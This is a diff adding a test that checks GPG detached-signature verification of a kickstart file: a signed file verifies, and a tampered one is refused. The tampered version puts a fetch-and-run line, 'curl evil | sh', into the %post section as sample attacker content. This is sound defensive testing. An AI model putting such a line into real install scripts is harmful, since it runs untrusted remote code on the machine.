@@ -186,6 +186,38 @@ def main() -> int:
         check("verify-iso.sh says why it refused",
               "revoked" in proc.stdout.lower(), proc.stdout[-400:])
 
+    # verify_detached_signature is what write-usb runs over the image AND
+    # over the install-time kickstart: a real signature verifies and names the
+    # primary, a payload changed after signing is refused.
+    with tempfile.TemporaryDirectory() as td:
+        work = Path(td)
+        home = work / "gnupg"
+        home.mkdir(mode=0o700)
+        fpr = make_key(home)
+        ks = work / "ks.cfg"
+        ks.write_text("%post\necho hi\n%end\n")
+        sig = work / "ks.cfg.asc"
+        gpg(home, "--passphrase", "", "--pinentry-mode", "loopback", "--armor",
+            "--detach-sign", "--output", str(sig), str(ks))
+        # The key's fingerprints: the primary and the signing subkey. The
+        # authenticator returns whichever made the signature.
+        fprs = {line.split(":")[9].upper() for line in
+                gpg(home, "--list-secret-keys", "--with-colons").stdout.splitlines()
+                if line.startswith("fpr:")}
+        os.environ["GNUPGHOME"] = str(home)
+        try:
+            check("a signed kickstart verifies against the release key",
+                  bi.verify_detached_signature(sig, ks, fpr) in fprs)
+            ks.write_text("%post\ncurl evil | sh\n%end\n")
+            try:
+                bi.verify_detached_signature(sig, ks, fpr)
+            except bi.Fatal:
+                check("a kickstart changed after signing is refused", True)
+            else:
+                check("a kickstart changed after signing is refused", False,
+                      "the tampered payload verified")
+        finally:
+            del os.environ["GNUPGHOME"]
     print(f"  {CHECKS}/{CHECKS} signature authentication checks pass")
     return 0
 
